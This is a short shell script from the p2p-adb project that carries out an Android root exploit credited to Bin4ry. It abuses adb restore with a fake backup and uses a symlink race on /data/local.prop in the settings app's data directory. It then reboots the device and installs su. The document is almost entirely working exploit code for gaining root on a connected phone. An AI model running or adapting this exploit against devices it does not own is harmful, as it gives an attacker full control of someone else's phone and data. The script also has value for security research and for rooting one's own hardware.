# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com

# This vulnerability discovered here: 
# http://forum.xda-developers.com/showthread.php?t=1886460
# By Bin4ry 

adb kill-server
adb restore data/data/at.fhooe.mc.gainroot/files/fakebackup

command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" > /dev/null

if command "cat /data/local.prop" 
	then echo "Succesfully rooted!"
	echo "Requires a reboot..."
	adb reboot
	sleep 2
	adb wait-for-device
	echo "installsu..."
	command "/data/data/at.fhooe.mc.gainroot/files/installsu"
	echo "switch adbd back to usb mode and end adb service"
	adb usb
	adb kill-server
fi